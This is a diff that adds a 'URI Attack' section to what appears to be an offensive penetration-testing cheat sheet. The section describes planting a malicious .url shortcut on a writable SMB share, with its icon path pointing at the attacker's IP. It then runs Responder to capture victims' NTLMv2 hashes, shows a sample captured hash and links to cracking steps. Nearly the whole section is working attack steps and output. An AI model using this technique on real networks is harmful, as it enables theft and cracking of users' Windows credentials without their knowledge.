@@ -491,6 +491,45 @@ STATUS_PASSWORD_MUST_CHANGE : correct password but has expired and needs to be c
 STATUS_LOGIN_FAILURE : incorrect password
 ```
 
+#### URI Attack
+
+##### ➤ Prerequisite : Write access to a smb folder
+```
+Check if is it possible to write in a folder
+- echo "this is a test" >> test.txt
+- upload the file in the smb folder using put command
+```
+
+##### ➤ Create the evil.url file
+Write in a evil.url file the following content. Replace the tun0 by the ip adress (tun0 or etho0, etc.)
+```
+[InternetShortcut]
+URL=Random_nonsense
+WorkingDirectory=abcdef
+IconFile=\\<YOUR tun0 IP>\%USERNAME%.icon
+IconIndex=1
+```
+
+##### ➤ Prepate our responder listener
+```
+sudo responder -I tun0 -wv 
+```
+
+##### ➤ Put the evil.url in the smb share and waiting ntlmv2 hash if the document is open
+```
+ex :
+[SMB] NTLMv2-SSP Client   : 192.168.58.172
+[SMB] NTLMv2-SSP Username : CYBERLAB\kiosec
+[SMB] NTLMv2-SSP Hash     : kiosec::CYBERLAB:09de3ec911a58870:0D4F3A68A10DAADDF7B4382A16916822:01010000000000000059D801EE14DC013815FA61C58073A80000000002000[REDACTED]0000010000000020000089AA92A8AA17227674842877BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350038000000000000000000 
+
+Keep in file only:
+kiosec::CYBERLAB:09de3ec911a58870:0D4F3A68A10DAADDF7B4382A16916822:01010000000000000059D801EE14DC013815FA61C58073A80000000002000[REDACTED]0000010000000020000089AA92A8AA17227674842877BD92C0EEF101C15360BF57E99844B804AA2DA3E00A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350038000000000000000000
+```
+
+##### ➤ Try to crack the hash
+See : https://github.com/Kiosec/Cracking/blob/main/README.md#netntlmv2ntlmv2-hash
+
+
 
 ## 🔻Port 143
 
